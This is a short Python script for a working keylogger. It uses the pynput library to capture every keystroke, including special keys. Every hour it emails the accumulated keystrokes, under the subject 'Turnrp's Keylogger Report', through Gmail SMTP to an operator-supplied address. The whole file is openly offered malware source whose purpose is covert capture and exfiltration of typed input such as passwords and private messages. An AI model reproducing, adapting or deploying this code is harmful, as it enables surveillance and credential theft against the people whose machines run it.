import smtplib as smtp
from email.message import EmailMessage
from ssl import create_default_context
from pynput import keyboard
from threading import Timer

EMAIL = "YOUR_EMAIL"
API_KEY = "YOUR_API_KEY"

KEY_STROKES = []
INTERVAL = 3600  # 1 Hour


def SendInfoToEmail():
    global KEY_STROKES
    with smtp.SMTP("smtp.gmail.com", 587) as server:
        server.ehlo()
        server.starttls(context=create_default_context())
        print("Establishing Connection..")
        server.ehlo()
        server.login(EMAIL, API_KEY)
        print("Logging in...")
        server.sendmail(
            EMAIL,
            EMAIL,
            "Subject: Turnrp's Keylogger Report\n\n" + "".join(KEY_STROKES),
        )  # Send The Keystrokes
        KEY_STROKES = []  # Reset the keystrokes so it dosen't get to long


def SendClock():
    Timer(INTERVAL, SendClock).start()
    SendInfoToEmail()


def on_press(key):
    try:
        KEY_STROKES.append(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            KEY_STROKES.append(" ")
        elif key == keyboard.Key.enter:
            KEY_STROKES.append("\n")
        elif key == keyboard.Key.shift:
            pass
        else:
            KEY_STROKES.append("\n" + str(key) + "\n")


SendClock()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
